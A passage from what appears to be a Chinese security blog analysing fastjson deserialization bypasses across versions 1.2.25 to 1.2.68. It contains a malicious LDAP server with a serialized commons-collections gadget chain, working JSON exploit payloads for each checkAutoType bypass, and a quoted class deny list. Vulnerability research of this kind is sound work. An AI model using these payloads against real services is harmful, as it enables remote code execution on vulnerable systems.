+                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv&quot; +
+                        &quot;cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB&quot; +
+                        &quot;H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4&quot; +
+                        &quot;cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSC&quot; +
+                        &quot;nnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5z&quot; +
+                        &quot;Zm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFp&quot; +
+                        &quot;bmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUv&quot; +
+                        &quot;Y29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9u&quot; +
+                        &quot;cy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hl&quot; +
+                        &quot;LmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGU&quot; +
+                        &quot;AgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBz&quot; +
+                        &quot;cgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zv&quot; +
+                        &quot;cm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5h&quot; +
+                        &quot;bWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNz&quot; +
+                        &quot;O3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1&quot; +
+                        &quot;cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsA&quot; +
+                        &quot;AAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAA&quot; +
+                        &quot;AnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAA&quot; +
+                        &quot;AAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAA&quot; +
+                        &quot;AAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdl&quot; +
+                        &quot;chLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAB&quot; +
+                        &quot;c3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xk&quot; +
+                        &quot;eHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;));
+                result.sendSearchEntry(e);
+                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+            &#125;
+            catch ( Exception e1 ) &#123;
+                e1.printStackTrace();
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>受害者客户端：</p>
+<pre><code>public class FastJson_JDBC &#123;
+    public static void main(String[] args) &#123;
+        ParserConfig config = new ParserConfig();
+        String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;
+        System.out.println(text1);
+        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+    &#125;
+&#125;
+</code></pre>
+<h1 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h1><p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，无法加载@type的class对象，方法都封装在<code>com.alibaba.fastjson.parser.ParserConfig</code>中</p>
+<p>开启<code>autoTypeSupport</code>：</p>
+<pre><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+</code></pre>
+<p>添加反序列化白名单有3种方法：</p>
+<ol>
+<li>使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(“com.study”)</li>
+<li>加上JVM启动参数：-Dfastjson.parser.autoTypeAccept&#x3D;com.study</li>
+<li>在fastjson.properties中添加：fastjson.parser.autoTypeAccept&#x3D;com.study</li>
+</ol>
+<p>可以看到几个成员变量，denyList是黑名单，acceptList 是反序列化白名单。</p>
+<pre><code>private boolean                                         autoTypeSupport = AUTO_SUPPORT;
+private String[]                                        denyList        = &quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;.split(&quot;,&quot;);
+private String[]                                        acceptList      = AUTO_TYPE_ACCEPT_LIST;
+</code></pre>
+<p>1.2.25替换<code>TypeUtils#loadClass</code>为<code>ParserConfig#checkAutoType</code>在反序列化前会做检查，如果开启了 <code>autoType</code>，先判断类名是否在白名单中，如果在，就使用 <code>TypeUtils.loadClass</code> 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。</p>
+<p><img src="/images/20230506211716.png"></p>
+<p>如果没开启 <code>autoType</code> ，则是先使用黑名单匹配，再使用白名单匹配和加载。最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 <code>autoType</code> 或者 <code>expectClass</code> 不为空也就是指定了 Class 对象时才会调用 <code>TypeUtils.loadClass</code> 加载。</p>
+<p><img src="/images/20230506211507.png"></p>
+<p>所以，不开启<code>autoType</code>只会加载白名单里中不在黑名单的类，开启 <code>autoType</code>会加载白名单和黑名单外的类。</p>
+<p>接着跟一下 <code>loadClass</code> ，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 <code>[</code>、<code>L</code>、<code>;</code> 字符，之前分析里也有提到过。</p>
+<p><img src="/images/20230505230134.png"></p>
+<p>最终的 payload 其实就是在之前的 payload 类名上前后加上<code>L</code>和<code>;</code>即可：</p>
+<pre><code>&#123;
+&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,
+&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1234/a&quot;,
+&quot;autoCommit&quot;:true
+&#125;
+</code></pre>
+<h1 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson-1.2.42"></a>fastjson-1.2.42</h1><p>在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。</p>
+<blockquote>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code>  </p>
+</blockquote>
+<p><code>com.alibaba.fastjson.parser.ParserConfig</code> 中，将原本的明文黑名单转为使用了 Hash 黑名单，防止安全人员对其研究。</p>
+<pre><code>this.denyHashCodes = new long[]&#123;-8720046426850100497L, -8109300701639721088L, -7966123100503199569L, -7766605818834748097L, -6835437086156813536L, -4837536971810737970L, -4082057040235125754L, -2364987994247679115L, -1872417015366588117L, -254670111376247151L, -190281065685395680L, 33238344207745342L, 313864100207897507L, 1203232727967308606L, 1502845958873959152L, 3547627781654598988L, 3730752432285826863L, 3794316665763266033L, 4147696707147271408L, 5347909877633654828L, 5450448828334921485L, 5751393439502795295L, 5944107969236155580L, 6742705432718011780L, 7179336928365889465L, 7442624256860549330L, 8838294710098435315L&#125;;
+</code></pre>
+<p>并且在 checkAutoType 中加入判断，如果类的第一个字符是 L 结尾是 ;，则使用 substring进行了去除。</p>
+<p><img src="/images/20230506213420.png"></p>
+<p>在最后处理时是递归处理，因此只要对描述符进行双写即可绕过：</p>
+<pre><code>&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;
+</code></pre>
+<h1 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h1><p>修复了双写绕过</p>
+<blockquote>
+<p>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43</p>
+</blockquote>
+<p>如果类名连续出现了两个 L 将会抛出异常</p>
+<p><img src="/images/20230506213519.png"></p>
+<p>但是漏了<code>[</code></p>
+<p>利用时发现，普通的进行拼接会报错，需要再payload后面再加个<code>[</code>修改token来绕过这个报错</p>
+<pre><code>&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,
+</code></pre>
+<p><img src="/images/20230506223310.png"></p>
+<p>但是这时依旧是数组的处理逻辑，但是我们没有]去闭合，需要将token设置为JSONToken.LBRACE跳出这个逻辑，逻辑在<code>JavaBeanDeserializer#deserialze</code>中:</p>
+<pre><code>if (token != JSONToken.LBRACE &amp;&amp; token != JSONToken.COMMA) &#123;
+    if (token == JSONToken.LITERAL_STRING) &#123;
+        String strVal = lexer.stringVal();
+        if (strVal.length() == 0) &#123;
+            lexer.nextToken();
+            return null;
+        &#125;
+        ...
+    &#125;
+    if (token == JSONToken.LBRACKET &amp;&amp; lexer.getCurrent() == &#39;]&#39;) &#123;
+                lexer.next();
+                lexer.nextToken();
+                return null;
+            &#125;
+
+StringBuffer buf = (new StringBuffer()) //
+                                .append(&quot;syntax error, expect &#123;, actual &quot;) //
+                                .append(lexer.tokenName()) //
+                                .append(&quot;, pos &quot;) //
+                                .append(lexer.pos());
+
+if (fieldName instanceof String) &#123;
+                    buf //
+                        .append(&quot;, fieldName &quot;) //
+                        .append(fieldName);
+                &#125;
+
+                buf.append(&quot;, fastjson-version &quot;).append(JSON.VERSION);
+                
+                throw new JSONException(buf.toString());
+            &#125;
+</code></pre>
+<p>修改token的逻辑在DefaultJSONParser#parseArray 687行或696行</p>
+<p><img src="/images/20230506230627.png"></p>
+<p>因为<code>while (lexer.token() == JSONToken.COMMA)</code>，会不断跳过逗号（JSONToken.COMMA就是逗号的token），所以不能将token设置为JSONToken.COMMA来绕过if，只能考虑将token设置为JSONToken.LBRACE，使用第一个nextToken来设置token</p>
+<pre><code>&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;
+</code></pre>
+<p><img src="/images/20230506231133.png"></p>
+<p>使用第二个nextToken来设置token</p>
+<pre><code>&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;
+</code></pre>
+<p><img src="/images/20230506231245.png"></p>
+<p>所以<code>[</code>和<code>&#123;</code>之间不管有多少个<code>,</code>都不会影响payload的执行，因为<code>while (lexer.token() == JSONToken.COMMA)</code></p>
+<p>最后总结payload:</p>
+<pre><code>&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,,,,,,&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/a\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;
+</code></pre>
+<h1 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson-1.2.45"></a>fastjson-1.2.45</h1><p>黑名单绕过, jackson 都是明文黑名单的，fastjson Hash黑名单其实无意义</p>
+<blockquote>
+<p>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45</p>
+</blockquote>
+<p>payload:</p>
+<pre><code>&#123;
+    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
+    &quot;properties&quot;:&#123;
+        &quot;data_source&quot;:&quot;ldap://127.0.0.1:1234/a&quot;
+    &#125;
+&#125;
+</code></pre>
+<h1 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h1><p>可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
+<blockquote>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code><br>影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code>  </p>
+</blockquote>
+<p>看到<code>checkAutoType() </code>方法</p>
+<pre><code>public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
+    // 类名非空判断
+    if (typeName == null) &#123;
+        return null;
+    &#125;
+    // 类名长度判断，不大于128不小于3
+    if (typeName.length() &gt;= 128 || typeName.length() &lt; 3) &#123;
+        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+    &#125;
+
+    String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
+    Class&lt;?&gt; clazz = null;
+
+    final long BASIC = 0xcbf29ce484222325L; //;
+    final long PRIME = 0x100000001b3L;  //L
+
+    final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
+    // 类名以 [ 开头抛出异常
+    if (h1 == 0xaf64164c86024f1aL) &#123; // [
+        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+    &#125;
+    // 类名以 L 开头以 ; 结尾抛出异常
+    if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) &#123;
+        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+    &#125;
+
+    final long h3 = (((((BASIC ^ className.charAt(0))
+            * PRIME)
+            ^ className.charAt(1))
+            * PRIME)
+            ^ className.charAt(2))
+            * PRIME;
+    // autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项
+    if (autoTypeSupport || expectClass != null) &#123;
+        long hash = h3;
+        for (int i = 3; i &lt; className.length(); ++i) &#123;
+            hash ^= className.charAt(i);
+            hash *= PRIME;
+            if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;
+                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                if (clazz != null) &#123;
+                    return clazz;
+                &#125;
+            &#125;
+            // 在对比 denyHashCodes 进行黑名单匹配
+            // 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类
+            // 则抛出异常
+            if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+            &#125;
+        &#125;
+    &#125;
+
+    // 尝试在 TypeUtils.mappings 中查找缓存的 class
+    if (clazz == null) &#123;
+        clazz = TypeUtils.getClassFromMapping(typeName);
+    &#125;
+
+    // 尝试在 deserializers 中查找这个类
+    if (clazz == null) &#123;
+        clazz = deserializers.findClass(typeName);
+    &#125;
+
+    // 如果找到了对应的 class，则会进行 return
+    if (clazz != null) &#123;
+        if (expectClass != null
+                &amp;&amp; clazz != java.util.HashMap.class
+                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
+            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+        &#125;
+
+        return clazz;
+    &#125;
+
+    // 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致
+    if (!autoTypeSupport) &#123;
+        long hash = h3;
+        for (int i = 3; i &lt; className.length(); ++i) &#123;
+            char c = className.charAt(i);
+            hash ^= c;
+            hash *= PRIME;
+
+            if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) &#123;
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+            &#125;
+
+            if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;
+                if (clazz == null) &#123;
+                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                &#125;
+
+                if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;
+                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                &#125;
+
+                return clazz;
+            &#125;
+        &#125;
+    &#125;
+    // 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类
+    if (clazz == null) &#123;
+        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+    &#125;
+
+    if (clazz != null) &#123;
+        if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) &#123;
+            return clazz;
+        &#125;
+
+        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
+                || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
+                ) &#123;
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        &#125;
+
+        if (expectClass != null) &#123;
+            if (expectClass.isAssignableFrom(clazz)) &#123;
+                return clazz;
+            &#125; else &#123;
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            &#125;
+        &#125;
+
+        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
+        if (beanInfo.creatorConstructor != null &amp;&amp; autoTypeSupport) &#123;
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        &#125;
+    &#125;
+
+    final int mask = Feature.SupportAutoType.mask;
+    boolean autoTypeSupport = this.autoTypeSupport
+            || (features &amp; mask) != 0
+            || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != 0;
+
+    if (!autoTypeSupport) &#123;
+        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+    &#125;
+
+    return clazz;
+&#125;
+</code></pre>
+<p>可以看到：当反序列化的类在黑名单中，会有个缓存的判断<code>TypeUtils.getClassFromMapping(typeName) == null</code>，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。</p>
+<p>并且在 <code>autoTypeSupport</code> 为默认的 false 判断之前，程序会在<code>mappings</code>和<code>deserializers</code>查找这个要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。</p>
+<pre><code>    if (clazz == null) &#123;
+        clazz = TypeUtils.getClassFromMapping(typeName);
+    &#125;
+
+    if (clazz == null) &#123;
+        clazz = deserializers.findClass(typeName);
+    &#125;
+
+    if (clazz != null) &#123;
+        if (expectClass != null
+                &amp;&amp; clazz != java.util.HashMap.class
+                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
+            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+        &#125;
+
+        return clazz;
+    &#125;
+
+    if (!autoTypeSupport) &#123;
+        ...
+        ...
+        ...
+    &#125;
+</code></pre>
+<p>所以只需要尝试注入这两个<code>mappings</code>和<code>deserializers</code></p>
+<p>先看 <code>deserializers</code> ，位于 <code>com.alibaba.fastjson.parser.ParserConfig.deserializers</code> ，是一个 IdentityHashMap，能向其中赋值的函数有：</p>
+<p><img src="/images/20230507000413.png"></p>
+<ul>
+<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
+<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
+<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li>
+</ul>
+<p>再来看 <code>mappings</code>,这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：</p>
+<p><img src="/images/20230507000714.png"></p>
+<ul>
+<li><code>addBaseClassMappings()</code>：无入参，加载</li>
+<li><code>loadClass()</code>：可以利用</li>
+</ul>
+<p><code>loadClass()</code>有三个重载方法：</p>
+<ul>
+<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache)</code>：调用链均在 <code>checkAutoType()</code> 和 <code>TypeUtils</code> 里自调用，略过。</li>
+<li><code>Class&lt;?&gt; loadClass(String className)</code>：除了自调用，有一个 <code>castToJavaBean()</code> 方法，暂未研究。</li>
+<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code>：方法调用三个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中，</li>
+</ul>
+<p>看看哪里会调用三个参数的重载方法：</p>
+<p><img src="/images/20230507001223.png"></p>
+<p>在<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>,<br>首先需要<code>if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) </code>，然后<code>if (clazz == Class.class)</code><br>首先调用parser.parse解析”val”这个value中的内容，放入<code>objVal</code>中</p>
+<p><img src="/images/20230507002116.png"></p>
+<p><code>objVal</code>会强转为String放入<code>strVal</code>中，之后当<code>clazz</code>为<code>Class.class</code>时候，clazz是@type中加载的class对象，并且不在黑名单之中，传入<code>TypeUtils.loadClass</code>方法中，放入<code>mappings</code>中缓存起来</p>
+<p><img src="/images/20230507002629.png"></p>
+<p>下一次调用<code>checkAutoType() </code>方法会先从缓存中取出，导致绕过</p>
+<p>payload:</p>
+<pre><code>&#123;&quot;1azy&quot;: &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;2azy&quot;: &#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:1234/a&quot;,&quot;autoCommit&quot;: true&#125;&#125;
+</code></pre>
+<h1 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson-1.2.68"></a>fastjson-1.2.68</h1><p>在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p>
+<blockquote>
+<p>影响版本：fastjson &lt;&#x3D; 1.2.68</p>
+</blockquote>
+<p>该版本加入了<code>safeMode</code>,如果开启会直接抛出异常，跳过 <code>checkAutoType</code></p>
+<p><img src="/images/20230507140909.png"></p>
+<p>但是<code>checkAutoType</code>依然存在一种绕过方式：利用 <code>expectClass</code> 绕过 <code>checkAutoType()</code>。</p>
+<p>在下面有这么一段逻辑，<code>expectClass</code>是<code>checkAutoType</code>中的参数，<code>clazz</code>是传入的类名<code>loadClass</code>后的Class对象，需要在黑名单以外，类名需要是<code>expectClass</code>的子类或实现</p>
+<pre><code>if (clazz != null) &#123;
+    if (expectClass != null
+            &amp;&amp; clazz != java.util.HashMap.class
+            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
+        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+    &#125;
+
+    return clazz;
+&#125;
+</code></pre>
+<p>所以只需要<code>expectClass</code>可控，并且类名传入<code>expectClass</code>的子类或实现，去寻找对应调用<code>checkAutoType()</code>方法处：</p>
+<ul>
+<li><p><code>ThrowableDeserializer#deserialze()</code></p>
+</li>
+<li><p><code>JavaBeanDeserializer#deserialze()</code></p>
+</li>
+</ul>
+<p><img src="/images/20230507143418.png"></p>
+<p><code>ThrowableDeserializer#deserialze()</code> 方法直接将 <code>@type</code> 后的类传入 <code>checkAutoType()</code> ，并且 expectClass 为 <code>Throwable.class</code>。</p>
+<p><img src="/images/20230507143601.png"></p>
+<p>通过 <code>checkAutoType()</code> 之后，将使用 <code>createException</code> 来创建异常类的实例。</p>
+<p><img src="/images/20230507144025.png"></p>
+<p>我们需要找到 <code>Throwable</code> 的子类，这个类的 getter&#x2F;setter&#x2F;static block&#x2F;constructor 中含有具有威胁的代码逻辑。</p>
+<p>与 <code>Throwable</code> 类似地，还有 <code>AutoCloseable</code> ，总结下使用 <code>AutoCloseable</code> 以及其子类可以绕过 <code>checkAutoType()</code> ：<br>第一，因为 <code>AutoCloseable</code> 在<code>TypeUtils#mappings</code>中，并且不在黑名单中</p>
+<pre><code>if (expectClass == null) &#123;
+    expectClassFlag = false;
+&#125; else &#123;
+    if (expectClass == Object.class
+            || expectClass == Serializable.class
+            || expectClass == Cloneable.class
+            || expectClass == Closeable.class
+            || expectClass == EventListener.class
+            || expectClass == Iterable.class
+            || expectClass == Collection.class
+            ) &#123;
+        expectClassFlag = false;
+    &#125; else &#123;
+        expectClassFlag = true;
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/images/20230507144756.png"></p>
+<p>第二，黑名单类，fastjson 在 denyHashCodes 里几乎把常见的容易造成漏洞的类都加进了黑名单</p>
+<p>第三，父类、父接口黑名单，fastjson 在判断期望类之前将继承自 ClassLoader、DataSource、RowSet 的类直接抛出异常。</p>
+<pre><code>if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
+        || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
+        || javax.sql.RowSet.class.isAssignableFrom(clazz) //
+        ) &#123;
+    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+&#125;
+</code></pre>
+<p>而常用的 JNDI RCE 类基本上都继承自 DataSource 和 RowSet，所以能找到的 JNDI gadget 基本都无法在这个漏洞中使用。</p>
+<blockquote>
+<p>fastjson 小于 1.2.51 时，还是可以通过实现了 RowSet 接口的类进行 JNDI 反序列化</p>
+</blockquote>
+<p><img src="/images/20230507145625.png"></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>创建一个实现AutoCloseable的类，setter方法中存在恶意代码</p>
+<pre><code>public class VulAutoCloseable implements AutoCloseable&#123;
+
+    private String cmd;
+
+    public void setCmd(String cmd) &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+        this.cmd = cmd;
+    &#125;
+
+    @Override
+    public void close() throws Exception &#123;
+
+    &#125;
+&#125;
+</code></pre>
+<p>受害者客户端</p>
+<pre><code>public class FastJson_68_Test &#123;
+    public static void main(String[] args) &#123;
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;com.study.fastjson.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;;
+        System.out.println(text1);
+        Object obj = JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);
+    &#125;
+&#125;
+</code></pre>
+<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p><code>DefaultJSONParser#parseObject</code>中,<code>checkAutoType</code>会检查第一个@type的内容，因为<code>java.lang.AutoCloseable</code>在mappings会直接通过</p>
+<pre><code>parseObject()&#123;
+    ...
+    if (!allDigits) &#123;
+        clazz = config.checkAutoType(typeName, null, lexer.getFeatures());
+    &#125;
+    ...
+&#125;
+
+checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
+...
+...
+clazz = TypeUtils.getClassFromMapping(typeName);
+
+
+    if (clazz != null) &#123;
+    if (expectClass != null
+            &amp;&amp; clazz != java.util.HashMap.class
+            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
+        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+    &#125;
+
+    return clazz;
+    &#125;
+</code></pre>
+<p><code>clazz</code>中存入<code>java.lang.AutoCloseable</code>的class对象，会在后面获取对应的解析器去解析，调用<code>JavaBeanDeserializer#deserialze()</code>，</p>
+<pre><code>//获取clazz的解析器
+ObjectDeserializer deserializer = config.getDeserializer(clazz);
+Class deserClass = deserializer.getClass();
+if (JavaBeanDeserializer.class.isAssignableFrom(deserClass)
+        &amp;&amp; deserClass != JavaBeanDeserializer.class
+        &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;
+    this.setResolveStatus(NONE);
+&#125; else if (deserializer instanceof MapDeserializer) &#123;
+    this.setResolveStatus(NONE);
+&#125;
+//解析
+Object obj = deserializer.deserialze(this, clazz, fieldName);
+</code></pre>
